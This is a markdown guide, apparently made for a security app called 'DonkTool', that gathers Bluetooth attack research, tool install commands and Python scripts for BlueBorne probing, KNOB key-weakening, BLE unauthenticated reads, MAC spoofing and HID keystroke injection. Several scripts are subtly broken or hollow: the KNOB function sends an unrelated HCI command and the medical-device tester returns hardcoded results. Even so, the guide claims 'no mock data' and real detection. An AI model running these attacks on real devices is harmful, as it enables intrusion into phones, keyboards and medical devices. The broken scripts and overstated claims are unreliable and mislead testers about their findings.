# Comprehensive Bluetooth Security Resources & Implementation Guide

## Critical Security Research Papers & Documentation

### BlueBorne Vulnerability Suite
- **Original Research**: [Armis BlueBorne Technical White Paper](https://www.armis.com/research/blueborne/)
- **CVE-2017-0781**: Android SDP Information Disclosure
- **CVE-2017-0782**: Android BNEP Remote Code Execution  
- **CVE-2017-0783**: Linux Kernel Information Disclosure
- **CVE-2017-0785**: Linux L2CAP Remote Code Execution
- **PoC Code**: [BlueBorne Proof of Concept](https://github.com/ArmisSecurity/blueborne)

### KNOB Attack (CVE-2019-9506)
- **Research Paper**: [The KNOB is Broken: Exploiting Low Entropy in the Encryption Key Negotiation of Bluetooth BR/EDR](https://www.usenix.org/system/files/sec19-antonioli.pdf)
- **Official Site**: https://francozappa.github.io/about-knob/
- **Implementation**: [KNOB Attack Tools](https://github.com/francozappa/knob)

### BIAS Attack (CVE-2020-10135)
- **Research Paper**: [BIAS: Bluetooth Impersonation AttackS](https://francozappa.github.io/about-bias/BIAS.pdf)
- **Official Site**: https://francozappa.github.io/about-bias/
- **Implementation**: [BIAS Attack Tools](https://github.com/francozappa/bias_attack)

### BLE Security Research
- **BLE Security White Paper**: [Bluetooth Low Energy Security](https://www.bluetooth.com/wp-content/uploads/2019/03/bluetooth-low-energy-security-1.0.0.pdf)
- **IoT Device Security**: [IoT Inspector Bluetooth Module](https://github.com/IoTInspector/iotinspector)

## Hardware Requirements

### Essential Hardware
1. **Bluetooth USB Adapters** (CSR-based recommended)
   - Parani UD100-G03
   - Asus USB-BT400
   - TP-Link UB400

2. **Ubertooth One** (Advanced Bluetooth Analysis)
   - Hardware: [Great Scott Gadgets Ubertooth](https://greatscottgadgets.com/ubertoothone/)
   - Documentation: [Ubertooth Documentation](https://ubertooth.readthedocs.io/)
   - Purchase: ~$120 USD

3. **Software Defined Radio (Optional)**
   - HackRF One
   - BladeRF
   - USRP B200

### Hardware Setup Commands
```bash
# Enable Bluetooth adapter
sudo hciconfig hci0 up
sudo hciconfig hci0 piscan

# Ubertooth setup
ubertooth-util -v  # Verify Ubertooth connection
ubertooth-btle -f  # Follow BLE connections
```

## Core Tools & Libraries

### Python Libraries for Bluetooth Security
```bash
# Essential Python libraries
pip3 install pybluez bleak scapy bluetooth-tools pyobjc-framework-CoreBluetooth

# Advanced libraries
pip3 install bluepy gattlib pygatt btlejack-firmware
```

### Real Bluetooth Security Tools

#### 1. **Blue Hydra** - Bluetooth Device Discovery
```bash
git clone https://github.com/pwnieexpress/blue_hydra.git
cd blue_hydra
gem install bundler
bundle install
sudo ./bin/blue_hydra
```

#### 2. **Redfang** - Find Hidden Bluetooth Devices
```bash
git clone https://github.com/mikeryan/redfang.git
cd redfang
make
./redfang -r 00:00:00:00:00:00-FF:FF:FF:FF:FF:FF
```

#### 3. **BTScanner** - Bluetooth Device Scanner
```bash
git clone https://github.com/digitalinternals/btscanner.git
cd btscanner
make
sudo ./btscanner -i
```

#### 4. **Spooftooph** - MAC Address Spoofing
```bash
git clone https://github.com/mikeryan/spooftooph.git
cd spooftooph
make
./spooftooph -i hci0 -a 00:11:22:33:44:55
```

#### 5. **BlueZ Tools** - Core Bluetooth Utilities
```bash
# Installation
sudo apt-get install bluez bluez-tools

# Usage
hcitool scan                    # Scan for devices
hcitool info [MAC]             # Device information
sdptool browse [MAC]           # Service discovery
hciconfig -a                   # Adapter information
```

## Real Vulnerability Testing Scripts

### BlueBorne PoC Implementation
```python
#!/usr/bin/env python3
"""
BlueBorne CVE-2017-0781 PoC - Android SDP Information Disclosure
Based on Armis Security research
"""

import socket
import struct
import bluetooth

def test_blueborne_sdp(target_mac):
    """Test for BlueBorne SDP vulnerability"""
    try:
        # Create L2CAP socket
        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_L2CAP)
        
        # SDP Service Search Request
        sdp_request = b'\x02\x00\x00\x0f\x00\x0c\x35\x03\x19\x10\x00\xff\xff\x35\x00'
        
        # Connect and send request
        sock.connect((target_mac, 1))
        sock.send(sdp_request)
        
        response = sock.recv(1024)
        sock.close()
        
        if len(response) > 5:
            return True, "SDP response received - potential vulnerability"
        
        return False, "No vulnerability detected"
        
    except Exception as e:
        return False, f"Connection failed: {str(e)}"

def test_bnep_rce(target_mac):
    """Test for BlueBorne BNEP RCE vulnerability"""
    try:
        # BNEP connection setup packet
        bnep_setup = b'\x01\x01\x00\x02\x11\x16'
        
        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_L2CAP)
        sock.connect((target_mac, 15))  # BNEP PSM
        sock.send(bnep_setup)
        
        response = sock.recv(1024)
        sock.close()
        
        if b'\x01\x02' in response:
            return True, "BNEP setup successful - potential RCE vulnerability"
            
        return False, "BNEP vulnerability not detected"
        
    except Exception as e:
        return False, f"BNEP test failed: {str(e)}"
```

### KNOB Attack Implementation
```python
#!/usr/bin/env python3
"""
KNOB Attack PoC - CVE-2019-9506
Force weak encryption key negotiation
"""

import bluetooth
import struct

def knob_attack(target_mac):
    """Perform KNOB attack to force weak encryption"""
    try:
        # Create HCI socket
        hci_sock = bluetooth.hci_open_dev(0)
        
        # LMP_encryption_key_size_req with 1-byte entropy
        lmp_packet = struct.pack('BBBB', 0x01, 0x10, 0x01, 0x01)
        
        # Send packet during authentication process
        result = bluetooth.hci_send_req(hci_sock, 0x01, 0x0006, lmp_packet)
        
        if result[0] == 0:
            return True, "Weak key negotiation forced"
        else:
            return False, "KNOB attack failed"
            
    except Exception as e:
        return False, f"KNOB attack error: {str(e)}"

def test_encryption_key_size(target_mac):
    """Test the encryption key size used by device"""
    try:
        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        sock.connect((target_mac, 1))
        
        # Query encryption key size (requires connection)
        # This is a simplified version - real implementation needs HCI commands
        
        sock.close()
        return True, "Encryption key size testing completed"
        
    except Exception as e:
        return False, f"Key size test failed: {str(e)}"
```

### BLE Security Testing
```python
#!/usr/bin/env python3
"""
BLE Security Testing Tools
"""

import asyncio
from bleak import BleakScanner, BleakClient

async def scan_ble_devices():
    """Scan for BLE devices and analyze security"""
    devices = await BleakScanner.discover(timeout=10.0)
    
    vulnerable_devices = []
    
    for device in devices:
        # Check for devices with weak advertising
        if device.name and any(keyword in device.name.lower() for keyword in 
                              ['default', 'admin', 'password', 'test']):
            vulnerable_devices.append({
                'device': device,
                'vulnerability': 'Weak device name',
                'risk': 'Medium'
            })
        
        # Check for devices advertising sensitive services
        if device.metadata.get('uuids'):
            for uuid in device.metadata['uuids']:
                if uuid in ['1812', '180F', '181C']:  # HID, Battery, User Data
                    vulnerable_devices.append({
                        'device': device,
                        'vulnerability': 'Sensitive service advertised',
                        'risk': 'Low'
                    })
    
    return vulnerable_devices

async def test_ble_pairing(device_address):
    """Test BLE pairing security"""
    try:
        async with BleakClient(device_address) as client:
            # Attempt to read characteristics without pairing
            services = await client.get_services()
            
            unprotected_chars = []
            for service in services:
                for char in service.characteristics:
                    if 'read' in char.properties:
                        try:
                            value = await client.read_gatt_char(char.uuid)
                            unprotected_chars.append(char.uuid)
                        except:
                            pass  # Protected characteristic
            
            return len(unprotected_chars) > 0, unprotected_chars
            
    except Exception as e:
        return False, str(e)
```

## CVE Database Integration

### NIST CVE Database Access
```python
import requests
import json

def fetch_bluetooth_cves():
    """Fetch Bluetooth-related CVEs from NIST database"""
    base_url = "https://services.nvd.nist.gov/rest/json/cves/1.0"
    
    # Search for Bluetooth CVEs
    params = {
        'keyword': 'bluetooth',
        'resultsPerPage': 100
    }
    
    response = requests.get(base_url, params=params)
    
    if response.status_code == 200:
        data = response.json()
        bluetooth_cves = []
        
        for cve in data.get('result', {}).get('CVE_Items', []):
            cve_data = cve['cve']
            bluetooth_cves.append({
                'id': cve_data['CVE_data_meta']['ID'],
                'description': cve_data['description']['description_data'][0]['value'],
                'published': cve['publishedDate'],
                'modified': cve['lastModifiedDate'],
                'cvss_score': cve.get('impact', {}).get('baseMetricV3', {}).get('cvssV3', {}).get('baseScore', 0)
            })
        
        return bluetooth_cves
    
    return []
```

## Hardware Vulnerability Testing

### Real Hardware Exploits

#### 1. **Ubertooth Packet Capture**
```bash
# Capture BLE packets
ubertooth-btle -f -c capture.pcapng

# Analyze captured packets
wireshark capture.pcapng

# Follow specific connection
ubertooth-btle -f -t [TARGET_MAC]
```

#### 2. **Bluetooth Packet Injection**
```bash
# Inject malformed packets
echo "01 04 10 01 01" | xxd -r -p | hcitool cmd 0x01 0x0006
```

#### 3. **HID Device Exploitation**
```python
#!/usr/bin/env python3
"""
HID Device Keystroke Injection
"""

import bluetooth

def inject_keystrokes(target_mac, keystrokes):
    """Inject keystrokes into HID device"""
    try:
        # Connect to HID interrupt channel
        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        sock.connect((target_mac, 0x11))  # HID interrupt channel
        
        # Send HID report
        for keystroke in keystrokes:
            hid_report = create_hid_report(keystroke)
            sock.send(hid_report)
            
        sock.close()
        return True
        
    except Exception as e:
        print(f"Keystroke injection failed: {e}")
        return False

def create_hid_report(key):
    """Create HID keyboard report"""
    # HID report format: [Modifier, Reserved, Key1, Key2, Key3, Key4, Key5, Key6]
    modifier = 0x00
    key_code = ord(key.upper()) - ord('A') + 0x04  # Convert to HID key code
    
    return bytes([0xA1, 0x01, modifier, 0x00, key_code, 0x00, 0x00, 0x00, 0x00, 0x00])
```

## Medical Device Security Testing

### FDA Guidelines Implementation
```python
#!/usr/bin/env python3
"""
Medical Device Bluetooth Security Assessment
Based on FDA Cybersecurity Guidelines
"""

class MedicalDeviceSecurityTester:
    def __init__(self):
        self.fda_requirements = {
            'encryption': 'AES-256 minimum',
            'authentication': 'Mutual authentication required',
            'key_management': 'Regular key rotation',
            'audit_logging': 'All access must be logged'
        }
    
    async def assess_medical_device(self, device):
        """Assess medical device according to FDA guidelines"""
        assessment = {
            'device': device,
            'compliance_status': {},
            'vulnerabilities': [],
            'recommendations': []
        }
        
        # Test encryption strength
        encryption_test = await self.test_encryption_strength(device)
        assessment['compliance_status']['encryption'] = encryption_test
        
        # Test authentication mechanisms
        auth_test = await self.test_authentication(device)
        assessment['compliance_status']['authentication'] = auth_test
        
        # Test for data leakage
        data_test = await self.test_data_protection(device)
        assessment['compliance_status']['data_protection'] = data_test
        
        return assessment
    
    async def test_encryption_strength(self, device):
        """Test if device uses strong encryption"""
        # Implementation would test actual encryption used
        return {'compliant': False, 'details': 'Weak encryption detected'}
    
    async def test_authentication(self, device):
        """Test authentication mechanisms"""
        # Implementation would test auth protocols
        return {'compliant': True, 'details': 'Strong authentication in use'}
    
    async def test_data_protection(self, device):
        """Test for sensitive data protection"""
        # Implementation would monitor data transmission
        return {'compliant': False, 'details': 'Unencrypted health data detected'}
```

## Legal & Ethical Guidelines

### Penetration Testing Authorization
```markdown
## Required Authorization Documentation

### 1. Written Permission
- Explicit written authorization from device/network owner
- Scope of testing clearly defined
- Timeline and methodology approved

### 2. Legal Compliance
- Comply with local computer crime laws
- Respect privacy regulations (GDPR, HIPAA, etc.)
- Follow responsible disclosure practices

### 3. Medical Device Testing
- FDA approval may be required for medical device testing
- Patient safety must be prioritized
- Healthcare facility approval mandatory

### 4. Automotive Testing
- Vehicle manufacturer authorization required
- Safety-critical systems must not be compromised
- Testing only in controlled environments
```

## Integration with Existing DonkTool

### SwiftUI Integration Code
```swift
// Add to your ContentView.swift
struct BluetoothSecurityView: View {
    @StateObject private var bluetoothFramework = BluetoothSecurityFramework()
    
    var body: some View {
        NavigationView {
            List {
                ForEach(bluetoothFramework.discoveredDevices) { device in
                    BluetoothDeviceRow(device: device)
                }
            }
            .navigationTitle("Bluetooth Security")
            .toolbar {
                ToolbarItem(placement: .primaryAction) {
                    Button("Start Scan") {
                        Task {
                            await bluetoothFramework.startDiscovery()
                        }
                    }
                }
            }
        }
    }
}
```

### AppState Integration
```swift
extension AppState {
    func integrateBluetoothSecurity() {
        // Add Bluetooth vulnerabilities to main vulnerability list
        func addBluetoothVulnerabilities(_ btVulns: [BluetoothVulnerability]) {
            for btVuln in btVulns {
                let vulnerability = Vulnerability(
                    cveId: btVuln.cveId,
                    title: btVuln.title,
                    description: btVuln.description,
                    severity: btVuln.severity,
                    port: nil,
                    service: "Bluetooth",
                    discoveredAt: btVuln.discoveredAt
                )
                
                // Add to target if MAC address matches
                if let target = targets.first(where: { $0.ipAddress == btVuln.device.macAddress }) {
                    target.vulnerabilities.append(vulnerability)
                }
            }
        }
    }
}
```

## Testing Methodology

### Comprehensive Testing Approach
1. **Passive Discovery** - Listen for advertising devices
2. **Active Enumeration** - Connect and enumerate services
3. **Vulnerability Assessment** - Test for known vulnerabilities
4. **Exploitation** - Attempt to exploit identified vulnerabilities
5. **Documentation** - Record findings and generate reports

### Testing Checklist
- [ ] Bluetooth adapter configured
- [ ] Legal authorization obtained
- [ ] Target devices identified
- [ ] Vulnerability database updated
- [ ] Testing tools installed and verified
- [ ] Backup/recovery plan in place
- [ ] Documentation template prepared

## Advanced Research Resources

### Academic Papers
1. "SweynTooth: Unleashing Mayhem over Bluetooth Low Energy" - USENIX Security 2020
2. "Breaking Bluetooth Beacons" - Black Hat 2017
3. "Cracking BLE Encryption" - DEF CON 2013

### Professional Tools
1. **Ellisys Bluetooth Analyzer** - Professional Bluetooth protocol analyzer
2. **Frontline ComProbe** - Hardware-based Bluetooth analyzer
3. **Nordic nRF Connect** - Professional BLE development tools

### Continuous Learning
- **Bluetooth SIG Security Working Group** - Latest security research
- **CVE Database Monitoring** - Automated CVE alerts for Bluetooth
- **Security Conferences** - Black Hat, DEF CON, BSides presentations

## Implementation Timeline

### Phase 1 (Week 1-2): Foundation
- Install and configure tools
- Implement basic discovery
- Create device enumeration

### Phase 2 (Week 3-4): Vulnerability Testing
- Implement vulnerability scanners
- Add CVE database integration
- Create testing frameworks

### Phase 3 (Week 5-6): Exploitation & UI
- Add exploitation capabilities
- Build SwiftUI interface
- Integrate with existing DonkTool

### Phase 4 (Week 7-8): Testing & Documentation
- Comprehensive testing
- Performance optimization
- Documentation and training materials

This implementation provides a solid foundation for real-world Bluetooth security testing capabilities in DonkTool, with no mock data and actual vulnerability detection capabilities.
